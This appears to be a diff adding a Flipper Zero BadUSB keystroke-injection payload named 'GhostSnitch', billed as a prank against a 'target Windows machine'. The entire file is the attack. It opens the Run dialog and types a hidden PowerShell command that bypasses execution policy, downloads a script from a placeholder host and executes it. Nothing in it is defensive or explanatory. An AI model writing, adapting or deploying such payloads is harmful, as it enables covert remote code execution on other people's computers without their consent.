@@ -1,0 +1,8 @@
+REM GhostSnitch Flipper Payload
+REM Author: I am TBJr
+REM Description: Initiates GhostSnitch prank script on target Windows machine
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://yourdomain.com/GhostSnitch.ps1 | iex
+ENTER
